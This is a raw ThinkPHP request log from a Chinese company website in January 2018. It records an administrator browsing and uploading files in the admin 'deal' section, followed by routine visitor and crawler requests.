[ log ] www.xinchumenye.com/admin/deal/apply.html [运行时间：0.015065s][吞吐率：66.38req/s] [内存消耗：2,234.91kb] [文件加载：49]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'deal',
    2 => 'apply',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/index/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Deal->apply[ /webdata/application/admin/controller/Deal.php ]
[ info ] [ VIEW ] /webdata/application/admin/view/deal/apply.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:32:34+08:00 ] 172.17.195.153 111.8.130.80 GET /admin/deal/index.html
[ log ] www.xinchumenye.com/admin/deal/index.html [运行时间：0.020510s][吞吐率：48.76req/s] [内存消耗：3,064.87kb] [文件加载：56]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'deal',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/index/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Deal->index[ /webdata/application/admin/controller/Deal.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/admin/view/deal/index.html [ array (
  0 => 'lunbo',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:32:36+08:00 ] 172.17.195.153 111.8.130.80 GET /admin/deal/apply.html
[ log ] www.xinchumenye.com/admin/deal/apply.html [运行时间：0.014574s][吞吐率：68.62req/s] [内存消耗：2,234.91kb] [文件加载：49]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'deal',
    2 => 'apply',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/index/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Deal->apply[ /webdata/application/admin/controller/Deal.php ]
[ info ] [ VIEW ] /webdata/application/admin/view/deal/apply.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:32:56+08:00 ] 172.17.195.153 111.8.127.80 GET /admin/deal/apply.html
[ log ] www.xinchumenye.com/admin/deal/apply.html [运行时间：0.014379s][吞吐率：69.55req/s] [内存消耗：2,234.91kb] [文件加载：49]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'deal',
    2 => 'apply',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/index/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Deal->apply[ /webdata/application/admin/controller/Deal.php ]
[ info ] [ VIEW ] /webdata/application/admin/view/deal/apply.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:32:58+08:00 ] 172.17.195.153 111.8.127.80 GET /admin/deal/index.html
[ log ] www.xinchumenye.com/admin/deal/index.html [运行时间：0.020932s][吞吐率：47.77req/s] [内存消耗：3,064.87kb] [文件加载：56]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'deal',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/index/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Deal->index[ /webdata/application/admin/controller/Deal.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/admin/view/deal/index.html [ array (
  0 => 'lunbo',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:33:20+08:00 ] 172.17.195.153 111.8.127.80 GET /admin/deal/index.html
[ log ] www.xinchumenye.com/admin/deal/index.html [运行时间：0.021143s][吞吐率：47.30req/s] [内存消耗：3,064.87kb] [文件加载：56]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'deal',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/index/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Deal->index[ /webdata/application/admin/controller/Deal.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/admin/view/deal/index.html [ array (
  0 => 'lunbo',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:33:25+08:00 ] 172.17.195.153 111.8.127.80 GET /admin/deal/index.html
[ log ] www.xinchumenye.com/admin/deal/index.html [运行时间：0.020886s][吞吐率：47.88req/s] [内存消耗：3,064.87kb] [文件加载：56]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'deal',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/index/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Deal->index[ /webdata/application/admin/controller/Deal.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/admin/view/deal/index.html [ array (
  0 => 'lunbo',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:33:26+08:00 ] 172.17.195.153 111.8.127.80 GET /admin/deal/apply.html
[ log ] www.xinchumenye.com/admin/deal/apply.html [运行时间：0.014229s][吞吐率：70.28req/s] [内存消耗：2,234.91kb] [文件加载：49]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'deal',
    2 => 'apply',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/index/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Deal->apply[ /webdata/application/admin/controller/Deal.php ]
[ info ] [ VIEW ] /webdata/application/admin/view/deal/apply.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:33:28+08:00 ] 172.17.195.153 111.8.127.80 POST /admin/deal/upload.html
[ log ] www.xinchumenye.com/admin/deal/upload.html [运行时间：0.015063s][吞吐率：66.39req/s] [内存消耗：2,243.00kb] [文件加载：51]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'deal',
    2 => 'upload',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/deal/apply.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cache-control' => 'no-cache',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
  'content-type' => 'multipart/form-data; boundary=---------------------------7e234717260ac2',
  'content-length' => '295',
)
[ info ] [ PARAM ] array (
  'filename' => '',
)
[ info ] [ RUN ] app\admin\controller\Deal->upload[ /webdata/application/admin/controller/Deal.php ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:33:42+08:00 ] 172.17.195.153 111.8.130.80 GET /admin/deal/apply.html
[ log ] www.xinchumenye.com/admin/deal/apply.html [运行时间：0.014190s][吞吐率：70.47req/s] [内存消耗：2,234.91kb] [文件加载：49]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'deal',
    2 => 'apply',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/index/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Deal->apply[ /webdata/application/admin/controller/Deal.php ]
[ info ] [ VIEW ] /webdata/application/admin/view/deal/apply.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:33:43+08:00 ] 172.17.195.153 111.8.130.80 GET /admin/deal/apply.html
[ log ] www.xinchumenye.com/admin/deal/apply.html [运行时间：0.015056s][吞吐率：66.42req/s] [内存消耗：2,234.91kb] [文件加载：49]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'deal',
    2 => 'apply',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/index/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Deal->apply[ /webdata/application/admin/controller/Deal.php ]
[ info ] [ VIEW ] /webdata/application/admin/view/deal/apply.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:33:44+08:00 ] 172.17.195.153 111.8.130.80 GET /admin/deal/index.html
[ log ] www.xinchumenye.com/admin/deal/index.html [运行时间：0.020433s][吞吐率：48.94req/s] [内存消耗：3,064.87kb] [文件加载：56]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'deal',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/index/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Deal->index[ /webdata/application/admin/controller/Deal.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/admin/view/deal/index.html [ array (
  0 => 'lunbo',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:33:46+08:00 ] 172.17.195.153 111.8.130.80 GET /admin/deal/apply.html
[ log ] www.xinchumenye.com/admin/deal/apply.html [运行时间：0.014306s][吞吐率：69.90req/s] [内存消耗：2,234.91kb] [文件加载：49]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'deal',
    2 => 'apply',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/index/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Deal->apply[ /webdata/application/admin/controller/Deal.php ]
[ info ] [ VIEW ] /webdata/application/admin/view/deal/apply.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:34:06+08:00 ] 172.17.195.153 111.8.127.80 POST /admin/deal/upload.html
[ log ] www.xinchumenye.com/admin/deal/upload.html [运行时间：0.016960s][吞吐率：58.96req/s] [内存消耗：2,325.90kb] [文件加载：52]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'deal',
    2 => 'upload',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/deal/apply.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cache-control' => 'no-cache',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
  'content-type' => 'multipart/form-data; boundary=---------------------------7e2282260ac2',
  'content-length' => '97220',
)
[ info ] [ PARAM ] array (
  'filename' => '',
)
[ info ] [ RUN ] app\admin\controller\Deal->upload[ /webdata/application/admin/controller/Deal.php ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:35:28+08:00 ] 172.17.195.153 111.8.130.80 GET /admin/index/index.html
[ log ] www.xinchumenye.com/admin/index/index.html [运行时间：0.015318s][吞吐率：65.28req/s] [内存消耗：2,183.79kb] [文件加载：48]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/login/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\admin\controller\Index->index[ /webdata/application/admin/controller/Index.php ]
[ info ] [ VIEW ] /webdata/application/admin/view/index/index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:35:28+08:00 ] 172.17.195.153 111.8.130.80 GET /admin/index/welcome.html
[ log ] www.xinchumenye.com/admin/index/welcome.html [运行时间：0.013833s][吞吐率：72.29req/s] [内存消耗：2,103.66kb] [文件加载：46]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'welcome',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/index/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\admin\controller\Index->welcome[ /webdata/application/admin/controller/Index.php ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:35:31+08:00 ] 172.17.195.153 111.8.130.80 GET /admin/deal/index.html
[ log ] www.xinchumenye.com/admin/deal/index.html [运行时间：0.020488s][吞吐率：48.81req/s] [内存消耗：3,064.87kb] [文件加载：56]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'deal',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/index/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Deal->index[ /webdata/application/admin/controller/Deal.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/admin/view/deal/index.html [ array (
  0 => 'lunbo',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:35:33+08:00 ] 172.17.195.153 111.8.130.80 GET /admin/deal/apply.html
[ log ] www.xinchumenye.com/admin/deal/apply.html [运行时间：0.014900s][吞吐率：67.11req/s] [内存消耗：2,234.91kb] [文件加载：49]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'deal',
    2 => 'apply',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/index/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Deal->apply[ /webdata/application/admin/controller/Deal.php ]
[ info ] [ VIEW ] /webdata/application/admin/view/deal/apply.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:45:40+08:00 ] 172.17.195.153 113.124.42.212 GET /
[ log ] www.xinchumenye.com/ [运行时间：0.024376s][吞吐率：41.02req/s] [内存消耗：2,778.31kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.xinchumenye.com',
  'accept' => 'text/html, */*',
  'accept-encoding' => 'identity',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:45:40+08:00 ] 172.17.195.153 113.124.42.212 GET /index/index/contact.html
[ log ] www.xinchumenye.com/index/index/contact.html [运行时间：0.020661s][吞吐率：48.40req/s] [内存消耗：2,745.43kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'contact',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.xinchumenye.com',
  'accept' => 'text/html, */*',
  'accept-encoding' => 'identity',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->contact[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/contact.html [ array (
  0 => 'lunbo',
  1 => 'link',
  2 => 'profile',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T11:33:54+08:00 ] 172.17.195.153 80.82.78.50 GET http://www.baidu.com/cache/global/img/gs.gif
[ log ] www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif [运行时间：0.011230s][吞吐率：89.05req/s] [内存消耗：1,508.71kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cache',
    1 => 'global',
    2 => 'img',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com',
  'user-agent' => 'Mozilla',
  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T11:40:17+08:00 ] 172.17.195.153 109.74.196.41 HEAD /
[ log ] xinchumenye.com/ [运行时间：0.025057s][吞吐率：39.91req/s] [内存消耗：2,778.06kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'xinchumenye.com',
  'user-agent' => 'python-requests/2.18.4',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T12:16:51+08:00 ] 172.17.195.153 106.11.242.185 GET /
[ log ] www.xinchumenye.com/ [运行时间：0.023833s][吞吐率：41.96req/s] [内存消耗：2,778.99kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'host' => 'www.xinchumenye.com',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
